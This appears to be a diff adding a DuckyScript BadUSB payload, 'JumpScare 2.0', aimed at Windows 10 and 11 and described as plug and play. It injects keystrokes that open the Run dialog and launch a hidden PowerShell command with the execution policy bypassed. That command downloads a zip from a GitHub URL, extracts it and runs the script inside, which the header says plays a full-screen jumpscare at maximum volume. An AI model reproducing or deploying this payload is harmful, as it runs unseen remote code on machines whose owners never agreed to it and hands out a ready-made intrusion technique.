@@ -1,0 +1,12 @@
+*     Title: JumpScare 2.0
+*     Author: I am Jakoby
+*     Description: This is a one liner payload that will execute and wait until a mouse movement is detected. Once one is a jumpscare will be played at max volume in full screen 
+*     Target: Windows 10, 11
+*     --------------------------------------------------------------------------------------
+*     THIS PAYLOAD IS PLUG AND PLAY. NO MODIFICATIONS NEEDED SIMPLY RUN THE CODE DOWN BELOW.
+*     --------------------------------------------------------------------------------------
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";iwr -Uri 'https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/Assets/js.zip' -O "$D\js.zip";Expand-Archive "$D\js.zip" -Des $D -Force;. "$D\js\js.ps1"
+ENTER
